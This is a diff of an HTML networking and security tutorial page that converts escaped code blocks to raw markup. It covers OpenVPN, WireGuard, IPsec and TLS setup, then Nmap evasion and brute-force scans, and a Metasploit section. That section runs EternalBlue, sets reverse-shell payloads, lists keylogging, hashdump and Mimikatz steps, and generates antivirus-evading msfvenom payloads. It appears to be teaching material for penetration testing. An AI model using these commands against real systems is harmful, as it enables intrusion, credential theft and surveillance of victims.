+<span class="fn">cat</span> << EOF > client1.ovpn
 client
 dev tun
 proto udp
@@ -1626,7 +1626,7 @@ tls-auth ta.key 1
 cipher AES-256-GCM
 auth SHA256
 verb 3
-EOF&lt;/div&gt;
+EOF</div>
         </div>
       </section>
 
@@ -1637,53 +1637,53 @@ EOF&lt;/div&gt;
         <p><strong>WireGuard</strong> is a modern VPN protocol that aims to be faster, simpler, and more performant than IPsec and OpenVPN. It uses state-of-the-art cryptography (Curve25519, ChaCha20, Poly1305, BLAKE2s) and has a minimal codebase (~4,000 lines vs. 400,000+ for OpenVPN/IPsec).</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Install WireGuard&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install wireguard
+          <div class="code-block"><span class="cmm"># Install WireGuard</span>
+<span class="fn">apt</span> install wireguard
 
-&lt;span class="cmm"&gt;# Generate server keys&lt;/span&gt;
-&lt;span class="fn"&gt;wg&lt;/span&gt; genkey | &lt;span class="fn"&gt;tee&lt;/span&gt; privatekey | &lt;span class="fn"&gt;wg&lt;/span&gt; pubkey &gt; publickey
+<span class="cmm"># Generate server keys</span>
+<span class="fn">wg</span> genkey | <span class="fn">tee</span> privatekey | <span class="fn">wg</span> pubkey > publickey
 
-&lt;span class="cmm"&gt;# Server configuration (/etc/wireguard/wg0.conf)&lt;/span&gt;
-[&lt;span class="kw"&gt;Interface&lt;/span&gt;]
-&lt;span class="kw"&gt;PrivateKey&lt;/span&gt; = &lt;span class="var"&gt;YOUR_SERVER_PRIVATE_KEY&lt;/span&gt;
-&lt;span class="kw"&gt;Address&lt;/span&gt; = &lt;span class="num"&gt;10.200.200.1/24&lt;/span&gt;
-&lt;span class="kw"&gt;ListenPort&lt;/span&gt; = &lt;span class="num"&gt;51820&lt;/span&gt;
-&lt;span class="kw"&gt;PostUp&lt;/span&gt; = &lt;span class="var"&gt;iptables&lt;/span&gt; -A FORWARD -i wg0 -j ACCEPT; &lt;span class="var"&gt;iptables&lt;/span&gt; -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-&lt;span class="kw"&gt;PostDown&lt;/span&gt; = &lt;span class="var"&gt;iptables&lt;/span&gt; -D FORWARD -i wg0 -j ACCEPT; &lt;span class="var"&gt;iptables&lt;/span&gt; -t nat -D POSTROUTING -o eth0 -j MASQUERADE
+<span class="cmm"># Server configuration (/etc/wireguard/wg0.conf)</span>
+[<span class="kw">Interface</span>]
+<span class="kw">PrivateKey</span> = <span class="var">YOUR_SERVER_PRIVATE_KEY</span>
+<span class="kw">Address</span> = <span class="num">10.200.200.1/24</span>
+<span class="kw">ListenPort</span> = <span class="num">51820</span>
+<span class="kw">PostUp</span> = <span class="var">iptables</span> -A FORWARD -i wg0 -j ACCEPT; <span class="var">iptables</span> -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+<span class="kw">PostDown</span> = <span class="var">iptables</span> -D FORWARD -i wg0 -j ACCEPT; <span class="var">iptables</span> -t nat -D POSTROUTING -o eth0 -j MASQUERADE
 
-[&lt;span class="kw"&gt;Peer&lt;/span&gt;]
-&lt;span class="cmm"&gt;# Client 1&lt;/span&gt;
-&lt;span class="kw"&gt;PublicKey&lt;/span&gt; = &lt;span class="var"&gt;CLIENT1_PUBLIC_KEY&lt;/span&gt;
-&lt;span class="kw"&gt;AllowedIPs&lt;/span&gt; = &lt;span class="num"&gt;10.200.200.2/32&lt;/span&gt;
+[<span class="kw">Peer</span>]
+<span class="cmm"># Client 1</span>
+<span class="kw">PublicKey</span> = <span class="var">CLIENT1_PUBLIC_KEY</span>
+<span class="kw">AllowedIPs</span> = <span class="num">10.200.200.2/32</span>
 
-[&lt;span class="kw"&gt;Peer&lt;/span&gt;]
-&lt;span class="cmm"&gt;# Client 2&lt;/span&gt;
-&lt;span class="kw"&gt;PublicKey&lt;/span&gt; = &lt;span class="var"&gt;CLIENT2_PUBLIC_KEY&lt;/span&gt;
-&lt;span class="kw"&gt;AllowedIPs&lt;/span&gt; = &lt;span class="num"&gt;10.200.200.3/32&lt;/span&gt;
+[<span class="kw">Peer</span>]
+<span class="cmm"># Client 2</span>
+<span class="kw">PublicKey</span> = <span class="var">CLIENT2_PUBLIC_KEY</span>
+<span class="kw">AllowedIPs</span> = <span class="num">10.200.200.3/32</span>
 
-&lt;span class="cmm"&gt;# Enable IP forwarding&lt;/span&gt;
-&lt;span class="fn"&gt;echo&lt;/span&gt; &lt;span class="str"&gt;"net.ipv4.ip_forward=1"&lt;/span&gt; &gt;&gt; /etc/sysctl.conf
-&lt;span class="fn"&gt;sysctl&lt;/span&gt; -p
+<span class="cmm"># Enable IP forwarding</span>
+<span class="fn">echo</span> <span class="str">"net.ipv4.ip_forward=1"</span> >> /etc/sysctl.conf
+<span class="fn">sysctl</span> -p
 
-&lt;span class="cmm"&gt;# Start WireGuard&lt;/span&gt;
-&lt;span class="fn"&gt;wg-quick&lt;/span&gt; up wg0
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; enable wg-quick@wg0
+<span class="cmm"># Start WireGuard</span>
+<span class="fn">wg-quick</span> up wg0
+<span class="fn">systemctl</span> enable wg-quick@wg0
 
-&lt;span class="cmm"&gt;# Client configuration&lt;/span&gt;
-[&lt;span class="kw"&gt;Interface&lt;/span&gt;]
-&lt;span class="kw"&gt;PrivateKey&lt;/span&gt; = &lt;span class="var"&gt;CLIENT_PRIVATE_KEY&lt;/span&gt;
-&lt;span class="kw"&gt;Address&lt;/span&gt; = &lt;span class="num"&gt;10.200.200.2/32&lt;/span&gt;
-&lt;span class="kw"&gt;DNS&lt;/span&gt; = &lt;span class="num"&gt;1.1.1.1&lt;/span&gt;
+<span class="cmm"># Client configuration</span>
+[<span class="kw">Interface</span>]
+<span class="kw">PrivateKey</span> = <span class="var">CLIENT_PRIVATE_KEY</span>
+<span class="kw">Address</span> = <span class="num">10.200.200.2/32</span>
+<span class="kw">DNS</span> = <span class="num">1.1.1.1</span>
 
-[&lt;span class="kw"&gt;Peer&lt;/span&gt;]
-&lt;span class="kw"&gt;PublicKey&lt;/span&gt; = &lt;span class="var"&gt;SERVER_PUBLIC_KEY&lt;/span&gt;
-&lt;span class="kw"&gt;Endpoint&lt;/span&gt; = &lt;span class="var"&gt;your-server.com:51820&lt;/span&gt;
-&lt;span class="kw"&gt;AllowedIPs&lt;/span&gt; = &lt;span class="num"&gt;0.0.0.0/0&lt;/span&gt;
-&lt;span class="kw"&gt;PersistentKeepalive&lt;/span&gt; = &lt;span class="num"&gt;25&lt;/span&gt;
+[<span class="kw">Peer</span>]
+<span class="kw">PublicKey</span> = <span class="var">SERVER_PUBLIC_KEY</span>
+<span class="kw">Endpoint</span> = <span class="var">your-server.com:51820</span>
+<span class="kw">AllowedIPs</span> = <span class="num">0.0.0.0/0</span>
+<span class="kw">PersistentKeepalive</span> = <span class="num">25</span>
 
-&lt;span class="cmm"&gt;# View active WireGuard connections&lt;/span&gt;
-&lt;span class="fn"&gt;wg&lt;/span&gt; show
-&lt;span class="fn"&gt;wg&lt;/span&gt; show wg0 allowed-ips&lt;/div&gt;
+<span class="cmm"># View active WireGuard connections</span>
+<span class="fn">wg</span> show
+<span class="fn">wg</span> show wg0 allowed-ips</div>
         </div>
         <div class="tip-box">
           <strong>Tip:</strong> For easier WireGuard management, use <strong>wg-easy</strong> (web UI) or <strong>PiVPN</strong> for automated setup. For mesh networking, consider <strong>Tailscale</strong> or <strong>Headscale</strong> (self-hosted Tailscale).
@@ -1712,38 +1712,38 @@ EOF&lt;/div&gt;
         </table>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# StrongSwan (Linux IPsec implementation)&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install strongswan
+          <div class="code-block"><span class="cmm"># StrongSwan (Linux IPsec implementation)</span>
+<span class="fn">apt</span> install strongswan
 
-&lt;span class="cmm"&gt;# Server configuration (/etc/ipsec.conf)&lt;/span&gt;
-&lt;span class="kw"&gt;config&lt;/span&gt; setup
-    &lt;span class="kw"&gt;charondebug&lt;/span&gt;=&lt;span class="str"&gt;"all"&lt;/span&gt;
-    &lt;span class="kw"&gt;uniqueids&lt;/span&gt;=&lt;span class="var"&gt;yes&lt;/span&gt;
+<span class="cmm"># Server configuration (/etc/ipsec.conf)</span>
+<span class="kw">config</span> setup
+    <span class="kw">charondebug</span>=<span class="str">"all"</span>
+    <span class="kw">uniqueids</span>=<span class="var">yes</span>
 
-&lt;span class="kw"&gt;conn&lt;/span&gt; ikev2-vpn
-    &lt;span class="kw"&gt;auto&lt;/span&gt;=&lt;span class="var"&gt;add&lt;/span&gt;
-    &lt;span class="kw"&gt;compress&lt;/span&gt;=&lt;span class="var"&gt;no&lt;/span&gt;
-    &lt;span class="kw"&gt;type&lt;/span&gt;=&lt;span class="var"&gt;tunnel&lt;/span&gt;
-    &lt;span class="kw"&gt;keyexchange&lt;/span&gt;=&lt;span class="var"&gt;ikev2&lt;/span&gt;
-    &lt;span class="kw"&gt;fragmentation&lt;/span&gt;=&lt;span class="var"&gt;yes&lt;/span&gt;
-    &lt;span class="kw"&gt;forceencaps&lt;/span&gt;=&lt;span class="var"&gt;yes&lt;/span&gt;
-    &lt;span class="kw"&gt;ike&lt;/span&gt;=&lt;span class="var"&gt;aes256-sha256-modp1024,3des-sha1-modp1024,aes256-sha384-modp2048!&lt;/span&gt;
-    &lt;span class="kw"&gt;esp&lt;/span&gt;=&lt;span class="var"&gt;aes256-sha256,aes256-sha384!&lt;/span&gt;
-    &lt;span class="kw"&gt;left&lt;/span&gt;=&lt;span class="var"&gt;%any&lt;/span&gt;
-    &lt;span class="kw"&gt;leftid&lt;/span&gt;=&lt;span class="var"&gt;@vpn.example.com&lt;/span&gt;
-    &lt;span class="kw"&gt;leftcert&lt;/span&gt;=&lt;span class="var"&gt;server-cert.pem&lt;/span&gt;
-    &lt;span class="kw"&gt;leftsendcert&lt;/span&gt;=&lt;span class="var"&gt;always&lt;/span&gt;
-    &lt;span class="kw"&gt;leftsubnet&lt;/span&gt;=&lt;span class="num"&gt;0.0.0.0/0&lt;/span&gt;
-    &lt;span class="kw"&gt;right&lt;/span&gt;=&lt;span class="var"&gt;%any&lt;/span&gt;
-    &lt;span class="kw"&gt;rightid&lt;/span&gt;=&lt;span class="var"&gt;%any&lt;/span&gt;
-    &lt;span class="kw"&gt;rightauth&lt;/span&gt;=&lt;span class="var"&gt;eap-mschapv2&lt;/span&gt;
-    &lt;span class="kw"&gt;rightsourceip&lt;/span&gt;=&lt;span class="num"&gt;10.10.10.0/24&lt;/span&gt;
-    &lt;span class="kw"&gt;rightdns&lt;/span&gt;=&lt;span class="num"&gt;8.8.8.8,8.8.4.4&lt;/span&gt;
-    &lt;span class="kw"&gt;rightsendcert&lt;/span&gt;=&lt;span class="var"&gt;never&lt;/span&gt;
-    &lt;span class="kw"&gt;eap_identity&lt;/span&gt;=&lt;span class="var"&gt;%identity&lt;/span&gt;
+<span class="kw">conn</span> ikev2-vpn
+    <span class="kw">auto</span>=<span class="var">add</span>
+    <span class="kw">compress</span>=<span class="var">no</span>
+    <span class="kw">type</span>=<span class="var">tunnel</span>
+    <span class="kw">keyexchange</span>=<span class="var">ikev2</span>
+    <span class="kw">fragmentation</span>=<span class="var">yes</span>
+    <span class="kw">forceencaps</span>=<span class="var">yes</span>
+    <span class="kw">ike</span>=<span class="var">aes256-sha256-modp1024,3des-sha1-modp1024,aes256-sha384-modp2048!</span>
+    <span class="kw">esp</span>=<span class="var">aes256-sha256,aes256-sha384!</span>
+    <span class="kw">left</span>=<span class="var">%any</span>
+    <span class="kw">leftid</span>=<span class="var">@vpn.example.com</span>
+    <span class="kw">leftcert</span>=<span class="var">server-cert.pem</span>
+    <span class="kw">leftsendcert</span>=<span class="var">always</span>
+    <span class="kw">leftsubnet</span>=<span class="num">0.0.0.0/0</span>
+    <span class="kw">right</span>=<span class="var">%any</span>
+    <span class="kw">rightid</span>=<span class="var">%any</span>
+    <span class="kw">rightauth</span>=<span class="var">eap-mschapv2</span>
+    <span class="kw">rightsourceip</span>=<span class="num">10.10.10.0/24</span>
+    <span class="kw">rightdns</span>=<span class="num">8.8.8.8,8.8.4.4</span>
+    <span class="kw">rightsendcert</span>=<span class="var">never</span>
+    <span class="kw">eap_identity</span>=<span class="var">%identity</span>
 
-&lt;span class="cmm"&gt;# Start StrongSwan&lt;/span&gt;
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; enable --now strongswan&lt;/div&gt;
+<span class="cmm"># Start StrongSwan</span>
+<span class="fn">systemctl</span> enable --now strongswan</div>
         </div>
       </section>
 
@@ -1767,27 +1767,27 @@ EOF&lt;/div&gt;
         <h3>Certificate Management</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Generate a private key and CSR&lt;/span&gt;
-&lt;span class="fn"&gt;openssl&lt;/span&gt; req -newkey rsa:4096 -keyout server.key -out server.csr -nodes
+          <div class="code-block"><span class="cmm"># Generate a private key and CSR</span>
+<span class="fn">openssl</span> req -newkey rsa:4096 -keyout server.key -out server.csr -nodes
 
-&lt;span class="cmm"&gt;# Generate a self-signed certificate&lt;/span&gt;
-&lt;span class="fn"&gt;openssl&lt;/span&gt; req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
+<span class="cmm"># Generate a self-signed certificate</span>
+<span class="fn">openssl</span> req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
 
-&lt;span class="cmm"&gt;# Let's Encrypt with certbot&lt;/span&gt;
-&lt;span class="fn"&gt;certbot&lt;/span&gt; certonly --standalone -d example.com
-&lt;span class="fn"&gt;certbot&lt;/span&gt; --nginx -d example.com
-&lt;span class="fn"&gt;certbot&lt;/span&gt; renew --dry-run
+<span class="cmm"># Let's Encrypt with certbot</span>
+<span class="fn">certbot</span> certonly --standalone -d example.com
+<span class="fn">certbot</span> --nginx -d example.com
+<span class="fn">certbot</span> renew --dry-run
 
-&lt;span class="cmm"&gt;# Check certificate details&lt;/span&gt;
-&lt;span class="fn"&gt;openssl&lt;/span&gt; x509 -in server.crt -text -noout
+<span class="cmm"># Check certificate details</span>
+<span class="fn">openssl</span> x509 -in server.crt -text -noout
 
-&lt;span class="cmm"&gt;# Check TLS configuration of a server&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script ssl-enum-ciphers -p 443 example.com
-&lt;span class="fn"&gt;testssl.sh&lt;/span&gt; example.com
-&lt;span class="fn"&gt;sslscan&lt;/span&gt; example.com
+<span class="cmm"># Check TLS configuration of a server</span>
+<span class="fn">nmap</span> --script ssl-enum-ciphers -p 443 example.com
+<span class="fn">testssl.sh</span> example.com
+<span class="fn">sslscan</span> example.com
 
-&lt;span class="cmm"&gt;# Check certificate expiration&lt;/span&gt;
-&lt;span class="fn"&gt;echo&lt;/span&gt; | &lt;span class="fn"&gt;openssl&lt;/span&gt; s_client -servername example.com -connect example.com:443 2&gt;/dev/null | &lt;span class="fn"&gt;openssl&lt;/span&gt; x509 -noout -dates&lt;/div&gt;
+<span class="cmm"># Check certificate expiration</span>
+<span class="fn">echo</span> | <span class="fn">openssl</span> s_client -servername example.com -connect example.com:443 2>/dev/null | <span class="fn">openssl</span> x509 -noout -dates</div>
         </div>
         <h3>TLS Best Practices</h3>
         <ul>
@@ -1808,65 +1808,65 @@ EOF&lt;/div&gt;
         <h3>Advanced Nmap Techniques</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Stealth scan (SYN scan without completing handshake)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sS -T2 target.com
+          <div class="code-block"><span class="cmm"># Stealth scan (SYN scan without completing handshake)</span>
+<span class="fn">nmap</span> -sS -T2 target.com
 
-&lt;span class="cmm"&gt;# Null, FIN, and Xmas scans (bypass simple firewalls)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sN target.com    &lt;span class="cmm"&gt;# Null scan (no flags)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sF target.com    &lt;span class="cmm"&gt;# FIN scan&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sX target.com    &lt;span class="cmm"&gt;# Xmas scan (FIN, PSH, URG)&lt;/span&gt;
+<span class="cmm"># Null, FIN, and Xmas scans (bypass simple firewalls)</span>
+<span class="fn">nmap</span> -sN target.com    <span class="cmm"># Null scan (no flags)</span>
+<span class="fn">nmap</span> -sF target.com    <span class="cmm"># FIN scan</span>
+<span class="fn">nmap</span> -sX target.com    <span class="cmm"># Xmas scan (FIN, PSH, URG)</span>
 
-&lt;span class="cmm"&gt;# Fragment packets (evade simple IDS)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -f target.com
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -ff target.com   &lt;span class="cmm"&gt;# Double fragment&lt;/span&gt;
+<span class="cmm"># Fragment packets (evade simple IDS)</span>
+<span class="fn">nmap</span> -f target.com
+<span class="fn">nmap</span> -ff target.com   <span class="cmm"># Double fragment</span>
 
-&lt;span class="cmm"&gt;# Decoy scan (hide your IP among fake ones)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -D RND:10,ME target.com   &lt;span class="cmm"&gt;# 10 random decoys + your IP&lt;/span&gt;
+<span class="cmm"># Decoy scan (hide your IP among fake ones)</span>
+<span class="fn">nmap</span> -D RND:10,ME target.com   <span class="cmm"># 10 random decoys + your IP</span>
 
-&lt;span class="cmm"&gt;# Idle scan (zombie host — completely anonymous)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sI zombie.com:80 target.com
+<span class="cmm"># Idle scan (zombie host — completely anonymous)</span>
+<span class="fn">nmap</span> -sI zombie.com:80 target.com
 
-&lt;span class="cmm"&gt;# OS detection and service version&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -A -T4 target.com
+<span class="cmm"># OS detection and service version</span>
+<span class="fn">nmap</span> -A -T4 target.com
 
-&lt;span class="cmm"&gt;# NSE scripts for vulnerability scanning&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script vuln target.com
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script "smb-*" target.com
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script "http-*" target.com
+<span class="cmm"># NSE scripts for vulnerability scanning</span>
+<span class="fn">nmap</span> --script vuln target.com
+<span class="fn">nmap</span> --script "smb-*" target.com
+<span class="fn">nmap</span> --script "http-*" target.com
 
-&lt;span class="cmm"&gt;# Scan IPv6&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -6 fe80::1
+<span class="cmm"># Scan IPv6</span>
+<span class="fn">nmap</span> -6 fe80::1
 
-&lt;span class="cmm"&gt;# Output to all formats&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -oA scan_results -A target.com
+<span class="cmm"># Output to all formats</span>
+<span class="fn">nmap</span> -oA scan_results -A target.com
 
-&lt;span class="cmm"&gt;# Top ports scan with service detection&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --top-ports 1000 -sV target.com&lt;/div&gt;
+<span class="cmm"># Top ports scan with service detection</span>
+<span class="fn">nmap</span> --top-ports 1000 -sV target.com</div>
         </div>
         <h3>Nmap NSE Scripts</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# List all NSE scripts&lt;/span&gt;
-&lt;span class="fn"&gt;ls&lt;/span&gt; /usr/share/nmap/scripts/
+          <div class="code-block"><span class="cmm"># List all NSE scripts</span>
+<span class="fn">ls</span> /usr/share/nmap/scripts/
 
-&lt;span class="cmm"&gt;# HTTP enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script http-enum target.com
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script http-title target.com
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script http-headers target.com
+<span class="cmm"># HTTP enumeration</span>
+<span class="fn">nmap</span> --script http-enum target.com
+<span class="fn">nmap</span> --script http-title target.com
+<span class="fn">nmap</span> --script http-headers target.com
 
-&lt;span class="cmm"&gt;# SMB enumeration and vulnerability scanning&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script smb-enum-shares target.com
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script smb-vuln-ms17-010 target.com   &lt;span class="cmm"&gt;# EternalBlue&lt;/span&gt;
+<span class="cmm"># SMB enumeration and vulnerability scanning</span>
+<span class="fn">nmap</span> --script smb-enum-shares target.com
+<span class="fn">nmap</span> --script smb-vuln-ms17-010 target.com   <span class="cmm"># EternalBlue</span>
 
-&lt;span class="cmm"&gt;# SSH brute force (with caution!)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target.com
+<span class="cmm"># SSH brute force (with caution!)</span>
+<span class="fn">nmap</span> --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target.com
 
-&lt;span class="cmm"&gt;# DNS enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script dns-brute target.com
+<span class="cmm"># DNS enumeration</span>
+<span class="fn">nmap</span> --script dns-brute target.com
 
-&lt;span class="cmm"&gt;# SSL/TLS analysis&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script ssl-enum-ciphers target.com
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script ssl-heartbleed target.com&lt;/div&gt;
+<span class="cmm"># SSL/TLS analysis</span>
+<span class="fn">nmap</span> --script ssl-enum-ciphers target.com
+<span class="fn">nmap</span> --script ssl-heartbleed target.com</div>
         </div>
       </section>
 
@@ -1890,54 +1890,54 @@ EOF&lt;/div&gt;
         </table>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Start Metasploit&lt;/span&gt;
-&lt;span class="fn"&gt;msfconsole&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># Start Metasploit</span>
+<span class="fn">msfconsole</span>
 
-&lt;span class="cmm"&gt;# Search for modules&lt;/span&gt;
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; search type:exploit platform:windows
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; search cve:2024 rank:excellent
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; search name:apache
+<span class="cmm"># Search for modules</span>
+<span class="fn">msf6</span> > search type:exploit platform:windows
+<span class="fn">msf6</span> > search cve:2024 rank:excellent
+<span class="fn">msf6</span> > search name:apache
 
-&lt;span class="cmm"&gt;# Use an exploit module&lt;/span&gt;
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; use exploit/windows/smb/ms17_010_eternalblue
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; show options
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; set RHOSTS 192.168.1.10
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; set LHOST 192.168.1.5
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; set LPORT 4444
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; exploit
+<span class="cmm"># Use an exploit module</span>
+<span class="fn">msf6</span> > use exploit/windows/smb/ms17_010_eternalblue
+<span class="fn">msf6</span> > show options
+<span class="fn">msf6</span> > set RHOSTS 192.168.1.10
+<span class="fn">msf6</span> > set LHOST 192.168.1.5
+<span class="fn">msf6</span> > set LPORT 4444
+<span class="fn">msf6</span> > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="fn">msf6</span> > exploit
 
-&lt;span class="cmm"&gt;# Meterpreter commands&lt;/span&gt;
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; help
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; sysinfo
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; getuid
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; ps
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; migrate 1234
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; shell
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; upload /local/file.txt C:\Windows\Temp\file.txt
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; download C:\Users\Admin\Desktop\secret.doc /tmp/
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; screenshot
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; keyscan_start
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; keyscan_dump
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; hashdump
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; load kiwi    &lt;span class="cmm"&gt;# Mimikatz integration&lt;/span&gt;
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; lsa_dump_sam
+<span class="cmm"># Meterpreter commands</span>
+<span class="fn">meterpreter</span> > help
+<span class="fn">meterpreter</span> > sysinfo
+<span class="fn">meterpreter</span> > getuid
+<span class="fn">meterpreter</span> > ps
+<span class="fn">meterpreter</span> > migrate 1234
+<span class="fn">meterpreter</span> > shell
+<span class="fn">meterpreter</span> > upload /local/file.txt C:\Windows\Temp\file.txt
+<span class="fn">meterpreter</span> > download C:\Users\Admin\Desktop\secret.doc /tmp/
+<span class="fn">meterpreter</span> > screenshot
+<span class="fn">meterpreter</span> > keyscan_start
+<span class="fn">meterpreter</span> > keyscan_dump
+<span class="fn">meterpreter</span> > hashdump
+<span class="fn">meterpreter</span> > load kiwi    <span class="cmm"># Mimikatz integration</span>
+<span class="fn">meterpreter</span> > lsa_dump_sam
 
-&lt;span class="cms"&gt;# Post-exploitation with modules&lt;/span&gt;
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; background
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; use post/windows/gather/enum_applications
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; set SESSION 1
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; run
+<span class="cms"># Post-exploitation with modules</span>
+<span class="fn">meterpreter</span> > background
+<span class="fn">msf6</span> > use post/windows/gather/enum_applications
+<span class="fn">msf6</span> > set SESSION 1
+<span class="fn">msf6</span> > run
 
-&lt;span class="cmm"&gt;# Generate payloads with msfvenom&lt;/span&gt;
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f macho -o payload.macho
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.py
+<span class="cmm"># Generate payloads with msfvenom</span>
+<span class="fn">msfvenom</span> -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
+<span class="fn">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
+<span class="fn">msfvenom</span> -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f macho -o payload.macho
+<span class="fn">msfvenom</span> -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
+<span class="fn">msfvenom</span> -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.py
 
-&lt;span class="cmm"&gt;# Encode payload to evade AV&lt;/span&gt;
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x64/xor -i 10 -f exe -o encoded.exe&lt;/div&gt;
+<span class="cmm"># Encode payload to evade AV</span>
+<span class="fn">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x64/xor -i 10 -f exe -o encoded.exe</div>
         </div>
       </section>
 
@@ -1963,37 +1963,37 @@ EOF&lt;/div&gt;
         <h3>Common Burp Suite Workflows</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">workflow</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
